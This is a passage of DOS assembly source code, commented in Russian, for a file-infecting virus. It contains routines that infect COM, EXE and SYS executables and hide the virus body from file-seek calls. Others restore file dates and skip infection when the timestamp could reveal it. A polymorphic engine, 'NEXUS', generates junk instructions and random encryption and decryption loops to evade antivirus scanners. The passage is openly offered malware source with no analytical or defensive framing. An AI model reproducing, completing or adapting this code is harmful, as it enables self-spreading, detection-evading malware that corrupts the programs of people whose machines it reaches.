        jc      chkd            ; DOS вернул сообщение об ошибке
        sub     dl,10000000b    ; проверка бита номер 7
        cmc
 chkd:  pop     dx ax
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; перевод двух латинских символов в AH и AL в верхний регистр
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 upreg: xchg    al,ah           ; меняем местами AL и AH
        call    upral           ; переводим в верхний регистр бывший AH
        xchg    al,ah           ; восстанавливаем положение AL и AH
        call    upral           ; переводим в верхний регистр AL
        ret                     ; выход из подпрограммы

 upral: cmp     al,'a'          ; проверка на нахождение AL
        jb      noupr           ; в интервале от 61h до 74h
        cmp     al,'z'
        ja      noupr
        sub     al,20h          ; перевод в верхний регистр
 noupr: ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; SeekHide
; если позиция lseek находится на теле вируса, подпрограмма переносит его
; на границу вируса и зараженной программы, т.е. на конец чистой программы
; SEEK_POS содержат новую позицию lseek
; NRBYTES уменьшается на разность двух позиций
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seekhide:
        call    SaveRegs        ; сохранение регистров
        call    SeekSave        ; сохраняем текущее положение указателя
        mov     cx,-1           ; двигаем указатель на границу вируса и
        mov     dx,-vsize       ; программы
        call    seekfrom_eof    ; DX:AX - голова вируса
        sub     ax,cs:seek_pos  ; SEEK_POS - старая позиция
        sbb     dx,cs:seek_pos+2
        cmp     dx,-1           ; DX:AX должно быть отрицательным
        jnz     not_us
        or      ax,ax
        jns     not_us
        neg     ax              ; получение разности позиций
        sub     cs:nrbytes,ax   ; уменьшение количества прочитанных байтов
        sub     cs:seek_pos,ax  ; уменьшение позиции указателя в файле
        sbb     cs:seek_pos,0   ; т.е. смещение ее на голову вируса
 not_us:
        call    RestoreSeek     ; восстановление позиции указателя
        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подсчет CRC вируса
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 crc:   push    si cx
        lea     si,shield
        mov     cx,end_crc-shield
        call    crc32
        pop     cx si
        ret

 CRC32: push    ebx ecx edx esi edi ds
        cld
        mov     di,cx
        mov     ecx,-1
        mov     edx,ecx
        mvs     ds,cs

   NextByteCRC:
        xor     eax,eax
        xor     ebx,ebx
        lodsb
        xor     al,cl
        mov     cl,ch
        mov     ch,dl
        mov     dl,dh
        mov     dh,8
   NextBitCRC:
        shr     bx,1
        rcr     ax,1
        jnc     NoCRC
        xor     ax,08320h
        xor     bx,0edb8h
   NoCRC:
        dec     dh
        jnz     NextBitCRC
        xor     ecx,eax
        xor     edx,ebx
        dec     di
        jnz     NextByteCRC
        not     edx
        not     ecx
        mov     eax,edx
        rol     eax,16
        mov     ax,cx
        pop     ds edi esi edx ecx ebx
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование handle
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Infect_Handle:
        push    cs cs           ; ds и es показывают на нас
        pop     ds es
        call    ioctl           ; проверка файла на фиктивность (disk file?)
        jc      close

        call    Inf_Check       ; проверка файла на повторное заражение
        jc      close

        mov     cx,32           ; чтение заголовка файла
        lea     dx,original
        call    read
        cmp     cx,ax           ; DOS вернул все запрошенные для
        jne     close           ; чтения байты?

        lea     si,original     ; сделать копию оригинального
        lea     di,header       ; начала программы
        mov     cx,32
        cld
        rep     movsb

        lea     di,header
        cmp     host,"S"        ; проверка на .SYS тип
        jz      sysinfect
        mov     ax,[di]         ; взять в ax первые 2 байта заголовка
        cmp     ax,'ZM'         ; проверка на EXE тип
        je      exeinfect
        cmp     ax,'MZ'         ; таких EXEшников я никогда не видел
        je      exeinfect       ; но говорят такие бывают
        jmp     cominfect

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование COM файла
; DI - заголовок, который нужно модифицировать
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 cominfect:
        mov     host,"C"        ; COM file
        cmp     w [di],-1       ; для предотвращения бага с .SYS файлами
        jz      Close           ; кстати это еще и вызовет int 06h
        call    seek2eof        ; получение размера файла
        or      dx,dx           ; размер файла больше 65535 байт?
        jnz     Close
        cmp     ax,65035-vsize  ; проверка файла на переполнение
        ja      Close           ; место еще оставлено под стек и PSP
        mov     b [di],0e9h     ; запись JMP
        mov     delta,ax        ; дополнительное смещение для полиморфа
        sub     ax,3            ; коррекция (минус размер jump'а)
        mov     w [di+1],ax     ; запись адреса перехода
        jmp     check

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование SYS файла
; DI - заголовок, который нужно модифицировать
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sysinfect:
        mov     host,"S"        ; SYS file
        cmp     d [di],-1       ; действительно драйвер?
        jnz     Close

        call    seek2eof        ; получение размера файла
        or      dx,dx           ; размер файла больше 65535 байт?
        jnz     Close
        cmp     ax,65035-vsize  ; проверка файла на переполнение
        ja      Close

        mov     w [di+8],ax     ; установка смещения процедуры прерывания
        add     w [di+8],Interrupt-ksenia
        mov     w [di+6],ax     ; установка смещения процедуры стратегии
        sub     ax,0100h
        mov     delta,ax        ; дополнительное смещение для полиморфа
        jmp     check

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование EXE файла
; DI - заголовок, который нужно модифицировать
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 exeinfect:
        mov     host,"E"        ; EXE file
        cmp     b [di+18h],'@'  ; проверка файла на принадлежность
        je      close           ; к новому семейству WinNE файлов

        mov     ax,W [di+4]     ; считать параметр PageCnt
        mov     cx,W [di+2]     ; считать параметр PartPag
        or      cx,cx           ; если длина последней страницы равна
        jz      $+3             ; нулю, то параметр PageCnt не содержит
        dec     ax              ; дополнительной единицы
        mov     dx,512          ; умножение на 512 (получение байт)
        mul     dx
        add     ax,cx           ; получение длины из EXE файла, которая
        adc     dx,0            ; грузится в память при запуске это EXE

        push    dx ax           ; сохранить пареметр в стеке
        call    seek2eof        ; получение дискового размера файла
        pop     si cx           ; загрузка параметров из стека
        cmp     si,ax           ; сравнение параметров (выявление
        jnz     Close           ; всяких overlay структур)
        cmp     cx,dx
        jnz     Close           ; очень большие файлы нам не подходят
        cmp     dx,10           ; как они в память грузяться??? но такие
        jae     Close           ; бывают (случается divide overflow ниже)

        push    ax dx           ; сохранение параметров
        mov     cx,16           ; получение входной точки (CS:IP), которые
        div     cx              ; расположены в конце чистого EXE файла
        sub     ax,[di+8]       ; вычитание размера EXE заголовка
        mov     delta,dx        ; дополнительное смещение для полиморфа
        sub     ax,10h          ; подобие COM файлу (IP больше/равно 100h)
        add     dx,100h
        mov     W [di+14h],dx   ; сохранение IP
        mov     W [di+16h],ax   ; сохранение CS
        mov     W [di+0eh],ax   ; сохранение SS (ой TBSCAN заорет)
        mov     W [di+10h],-2   ; сохранение SP
        pop     dx ax           ; загрузка параметров из стека

        add     ax,vsize        ; добавление к размеру файла
        adc     dx,0            ; длины вируса
        mov     cx,512          ; считаем новые PartPag и PageCnt для
        div     cx              ; файла вместе с вирусом
        or      dx,dx
        jz      $+3
        inc     ax
        mov     [di+2],dx       ; сохранение PartPag
        mov     [di+4],ax       ; сохранение PageCnt

 Check: call    WriteVirus      ; запись вирус в файл

 Close: call    CorrectDate     ; правка даты инфицированного файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; запись зашифрованного тела вируса в файл
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 WriteVirus:
        call    GetDate         ; запрос времени/даты файла

        cmp     cs:save_ax,1857h; проверка необходимости порверки
        jz      no_time         ; времени файла

        mov     ah,2ch          ; запрос текущего времени
        call    int21           ; в dx:cx
        mov     ax,cs:time      ; в ax время файла
        shr     ah,3            ; берем часы (биты 11-15 в cx)
        cmp     ah,ch           ; совпадают? если да, то съябываемся,
        je      write_fail      ; чтобы не засветиться
 no_time:
        call    seek2eof        ; -> конец
        call    nexus
        call    write           ; записываемся в файл
        xor     cx,ax           ; все записалось?
        jnz     write_fail

        call    seek2bof        ; идем в начало
        mov     cx,32           ; заголовок com/exe файла
        lea     dx,header
        mov     w header+12h,v_id
        call    write

  write_fail:
        call    RestDate        ; восстановление даты файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка файла на инфицированность
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Inf_Check:
       call    SaveRegs         ; сохранить в стеке регистры

       call    SeekSave         ; сохраняем позицию lseek
       call    seek2bof         ; переносим указатель на начало

       mov     cx,32            ; читаем заголовок в буфер
       lea     dx,buffer
       push    cs cs
       pop     ds es
       call    read

       call    RestoreSeek      ; восстановить позицию lseek
       xor     cx,ax            ; все прочиталось?
       jnz     not_infected
       cmp     w buffer+12h,v_id
       jnz     not_infected

       call    LoadRegs
       stc
       ret

 not_infected:
       call    LoadRegs
       clc
       ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; CRLOAD - подпрограмма для получения оригинального начала
; зараженной программы из зашифрованного вируса в этой программе
; вход: BX - handle инфицированной программы
; выход: "buffer" содержит 32 оригинальных байта
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 crload:
        call    SaveRegs        ; сохранение регистров
        push    cs cs           ; инициализация сегментных регистров
        pop     ds es

        xor     cx,cx           ; сохранение позиции указателя в файле
        xor     dx,dx
        call    seekfrom_cur
        push    dx ax

        mov     cx,-1           ; идем в конец вируса
        mov     dx,-32          ;
        call    seekfrom_eof    ;

        mov     cx,32           ; читаем заголовок
        lea     dx,buffer       ; в буфер
        call    read

        pop     dx cx           ; восстанавливаем позицию указателя
        call    seekfrom_bof

        call    LoadRegs        ; восстановление регистров
        ret

░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒
; POLYMORPHIC ENGINE [NEXUS]
; в качестве входных параметров установить DELTA как экстра смещение в файле
; на выходе CX,DX готовы к вызову функции 40h прерывания int 21h
░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒░▒
 nexus: call    SaveRegs        ; инициализация
        push    cs cs
        pop     ds es
        cld
        lea     di,buffer

        mov     al,60h
        stosb

        mov     r_used,-1       ; ни один из регистров не используется
        call    garbage         ; генерация мусора

        mov     w_flag,1        ; Инициализация Счетчика
        call    get_reg         ; получение номера регистра
        mov     b r_used,al     ; занесение его в список использованных
        or      al,10111000b    ; создание команды MOV REG,Const (16)
        stosb                   ; сохранение команды
        mov     ax,vsize-crlen-32 ; вычисление количества байт для зашифровки
        stosw                   ; сохранение константы

        call    garbage         ; генерация мусора

 gidx:  mov     w_flag,1        ; генерация 16-битного адресного регистра
        call    get_reg         ; генерация случайного регистра
        mov     ah,111b         ; проверка на адресный регистр и получения
        cmp     al,011b         ; параметра для адресации с помощью этого
        je      sidx            ; регистра
        mov     ah,100b
        cmp     al,110b
        je      sidx
        mov     ah,101b
        cmp     al,111b
        jne     gidx

 sidx:  mov     b r_used+1,al   ; сохранение номера адресного регистра
        mov     rm_flag,ah      ; сохранение параметра R/M

        or      al,10111000b    ; Инициализация Адресного Регистра
        stosb                   ; создание команды MOV REG,Const (16)
        mov     ax,delta        ; вычисление смещения начала зашифрованного
        add     ax,crlen+100h   ; вируса в файле
        stosw

        call    garbage         ; генерация мусора

 rchos: mov     bp,di           ; сохранение указателя на дескриптор
        mov     ax,oplen        ; выбор случайного шифровщика
        call    xrandom
        mov     si,ax           ; SI=AX*2
        add     si,ax
        mov     ax,w [si+enopI] ; чтение шифровщика
        or      ah,101b         ; зашифровка будет идти с участием DI
        bt      ax,1            ; проверка необходимости ключа
        mov     w nbuf,ax       ; сохранение шифратора
        mov     b nbuf+3,0c3h   ; RETn
        mov     al,90h          ; NOP
        jc      nokey

        mov     ax,0ffh         ; получение случайного числа
        call    xrandom
        inc     ax              ; исключение попадания 0
 nokey: mov     b nbuf+2,al

        mov     al,[di]         ; проверка команды: на самом деле она
        call    near ptr nbuf   ; зашифровывает байт?
        cmp     al,[di]
        jz      rchos

        mov     al,2eh          ; Генерация Дешифратора
        stosb                   ; SEGCS
        mov     ax,w [si+deopI] ; чтение расшифровщика
        or      ah,rm_flag      ; правка опкода (учет R/M адресного регистра)
        stosw
        bt      ax,1            ; проверка необходимости ключа
        jc      uukey
        mov     al,b nbuf+2     ; копирование ключа из буфера
        stosb                   ; в дескриптор

 uukey: call    garbage         ; генерация мусора

        mov     al,01000000b    ; Генерация увеличения индексного регистра
        or      al,b r_used+1
        stosb
        call    garbage         ; генерация мусора

        mov     al,01001000b    ; Уменьшаем счетчик
        or      al,b r_used
        stosb
        mov     al,01110101b    ; Генерируем команду JNZ
        stosb                   ; переход на дескриптор
        mov     ax,bp
        sub     ax,di
        dec     ax
        stosb

        mov     si,di           ; подготовка к генерации нехватающих
        sub     si,offset buffer ; мусорных команд (заполнение всего
        mov     ax,crlen        ; предоставленного под дескриптор места
        sub     ax,si           ; мусорными командами)
        mov     cx,ax
        dec     cx
        mov     r_used,-1       ; ни один из регистров не используется
        call    ncmd            ; генерация CX байт мусора
        mov     al,61h
        stosb

        mov     cx,shield-ksenia-crlen
        lea     si,ksenia+crlen
        lea     di,buffer+crlen
        rep     movsb
        mov     cx,endi-shield-1
 dupcr: lodsb
        sub     al,[si]
        stosb
        loop    dupcr
        mov     cx,eov-endi+1
        rep     movsb

        mov     cx,vsize-crlen-32
        lea     di,buffer+crlen
 encp:  call    near ptr nbuf
        inc     di
        loop    encp

        call    LoadRegs
        mov     cx,vsize
        lea     dx,buffer
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для генерации мусорного кода случайного размера
; DS=ES=CS, [DI] - буфер для мусора (DI инкрементируется)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 gmax   equ     crlen/7
 gmin   equ     gmax/2
 garbage:
        push    ax cx
        mov     ax,gmax-gmin
        call    xrandom
        add     ax,gmin
        xchg    ax,cx
        call    ncmd
        pop     cx ax
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для генерации мусорного кода на базе таблицы
; DS=ES=CS, [DI] - буфер для мусора (DI инкрементируется)
; CX - нужная длина всего мусора
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ncmd:  push    ax bx cx dx si  ; сохранение регистров
        jcxz    gret

 ggen:  push    di cx
        lea     di,crbuf
        call    gcmd
        xchg    ax,cx
        pop     cx di
        cmp     cx,ax
        jc      ggen
        lea     si,crbuf

 gdup:  movsb
        dec     cx
        dec     ax
        jnz     gdup
        or      cx,cx
        jnz     ggen

 gret:  pop     si dx cx bx ax ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для генерации случайной мусорной инструкции
; DS=ES=CS, [DI] - буфер для инструкции
; на выходе CX - длина инструкции в байтах
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 gcmd:  push    ax bx dx si di  ; сохранение регистров
        mov     cx,2            ; регенерация: 2 раза

 greg:  lea     si,opcode       ; таблица с опкодами
        mov     ax,oclen        ; генерация случайного числа в пределе от
        call    xrandom         ; нуля до количества строк в таблице
        add     si,ax           ; получение смещения к выбранной ячейке
        add     si,ax
        add     si,ax
        mov     dl,[si]         ; загрузка Управляющего_байта
        mov     ax,[si+1]       ; копирование шаблона инструкции
        mov     [di],ax

        test    dx,10000000b    ; проверка флага регенерации
        loopnz  greg

        xor     bx,bx
        bt      dx,0            ; установка длины инструкции
        setc    bl

        bt      dx,6
        setc    w_flag
        test    dl,00000100b    ; проверка необходимости генерации
        jz      nWRD            ; поля WRD
        mov     ax,2
        call    xrandom
        mov     w_flag,al
        test    dl,00100000b
        jz      bit1
        rol     al,3
  bit1: or      [di],al         ; установка поля в ячейке памяти
 nWRD:  test    dl,00000010b    ; проверка необходимости генерации
        jz      nREG            ; поля REG
        call    get_reg         ; генерация случайного регистра
        or      [di+bx],al      ; установка поля в ячейке памяти
 nREG:  mov     cl,dl
        shr     cl,3
        and     cl,11b          ; проверка необходимости генерации
        jz      nRND            ; случайного значения после инструкции
        cmp     cl,11b
        jne     pRND
        mov     cl,w_flag
        inc     cl
 pRND:  xor     ax,ax
        call    xrandom
        mov     [di+bx+1],al
        inc     bx
        dec     cl
        jnz     pRND
 nRND:  mov     cx,bx
        inc     cx
        pop     di si dx bx ax  ; загрузка регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для генерации номера регистра в AL
; на входе: r_used (2 байта) - номера занятых 16-битных регистров
;           w_flag - разрядность регистра (0-8 бит,1-16 бит)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 get_reg:
        mov     ax,8            ; получаем случайный номер
        call    xrandom         ; от 0 до 7
        mov     ah,al           ; дублируем его

        cmp     w_flag,1        ; тип запрашиваемого регистра
        jz      r16             ; в случае 8-битного регистра проверка, не
        and     ah,11111011b    ; является ли он половинкой использованных
        jmp     r_chk           ; регистров r_used

 r16:   cmp     ah,100b         ; в случае 16-битного регистра проверка, не
        jz      get_reg         ; является ли он регистром SP

 r_chk: cmp     b r_used,ah     ; сейчас проверяем, не получили ли мы
        jz      get_reg         ; уже использованный регистр, записанный
        cmp     b r_used+1,ah   ; в r_used
        jz      get_reg
        cbw                     ; ah=0
        ret                     ; выход из подпрограммы

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Таблица опкодов для мусора (DB Управляющий_байт, DB опкод, DB опкод)
; Управляющий_байт выглядит следующим образом:
; 00000000
; │││└┤││└ длина инструкции (+1 байт)
; │││ ││└─ надобность поля REG (биты [0-2] последнего байта команды)
; │││ │└── надобность поля WRD
; │││ └─── добавление случайного значения (00-нет,01-байт,10-слово,11-по WRD)
; ││└───── положение поля WRD (0-бит 0, 1-бит 3 первого байта команды)
; │└────── значение поля WRD, если его не надо генерить
; └─────── регенерация случайного числа
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 opcode db      00111110b,10110000b,00000000b ; MOV     REG,Const (8/16)
        db      00011111b,11110110b,11000000b ; TEST    REG,Const (8/16)
        db      00011111b,10000000b,11000000b ; ADD     REG,Const (8/16)
        db      00011111b,10000000b,11001000b ; OR      REG,Const (8/16)
        db      00011111b,10000000b,11010000b ; ADC     REG,Const (8/16)
        db      00011111b,10000000b,11011000b ; SBB     REG,Const (8/16)
        db      00011111b,10000000b,11100000b ; AND     REG,Const (8/16)
        db      00011111b,10000000b,11101000b ; SUB     REG,Const (8/16)
        db      00011111b,10000000b,11110000b ; XOR     REG,Const (8/16)
        db      00011111b,10000000b,11111000b ; CMP     REG,Const (8/16)

        db      00111110b,10110000b,00000000b ; MOV     REG,Const (8/16)
        db      00001111b,11000000b,11000000b ; ROL     REG,Const (8/16)
        db      00001111b,11000000b,11001000b ; ROR     REG,Const (8/16)
        db      00001111b,11000000b,11010000b ; RCL     REG,Const (8/16)
        db      00001111b,11000000b,11011000b ; RCR     REG,Const (8/16)
        db      00001111b,11000000b,11100000b ; SHL/SAL REG,Const (8/16)
        db      00001111b,11000000b,11101000b ; SHR     REG,Const (8/16)
        db      00001111b,11000000b,11111000b ; SAR     REG,Const (8/16)

        db      00111110b,10110000b,00000000b ; MOV     REG,Const (8/16)
        db      00000111b,11110110b,11011000b ; NEG     REG       (8/16)
        db      00000111b,11110110b,11010000b ; NOT     REG       (8/16)
        db      00000011b,11111110b,11000000b ; INC     REG       (8)
        db      00000011b,11111110b,11001000b ; DEC     REG       (8)
        db      01000010b,01000000b,00000000b ; INC     REG       (16)
        db      01000010b,01001000b,00000000b ; DEC     REG       (16)

        db      00111110b,10110000b,00000000b ; MOV     REG,Const (8/16)
        db      10000001b,01110100b,00000000b ; JE      NEXTCMD
        db      10000001b,01111100b,00000000b ; JL      NEXTCMD
        db      10000001b,01111110b,00000000b ; JLE     NEXTCMD
        db      10000001b,01110010b,00000000b ; JB      NEXTCMD
        db      10000001b,01110110b,00000000b ; JP      NEXTCMD
        db      10000001b,01111010b,00000000b ; JO      NEXTCMD
        db      10000001b,01110000b,00000000b ; JS      NEXTCMD
        db      10000001b,01111000b,00000000b ; JNE     NEXTCMD
        db      10000001b,01110101b,00000000b ; JNL     NEXTCMD
        db      10000001b,01111101b,00000000b ; JG      NEXTCMD
        db      10000001b,01110011b,00000000b ; JAE     NEXTCMD
        db      10000001b,01110111b,00000000b ; JA      NEXTCMD
        db      10000001b,01111011b,00000000b ; JNP     NEXTCMD
        db      10000001b,01110001b,00000000b ; JNO     NEXTCMD
        db      10000001b,01111001b,00000000b ; JNS     NEXTCMD
        db      10000001b,11100011b,00000000b ; JCXZ    NEXTCMD
        db      10000001b,11101011b,00000000b ; JMP     NEXTCMD

        db      00111110b,10110000b,00000000b ; MOV     REG,Const (8/16)
        db      10000000b,11111000b,00000000b ; CLC
        db      10000000b,11110101b,00000000b ; CMC
        db      10000000b,11111001b,00000000b ; STC
        db      10000000b,11111100b,00000000b ; CLD
        db      10000000b,11111101b,00000000b ; STD
        db      10000000b,11111010b,00000000b ; CLI
        db      10000000b,11111011b,00000000b ; STI

 oclen  equ     (this byte-opcode)/3

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Таблица опкодов для инструкций за/расшифровки
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
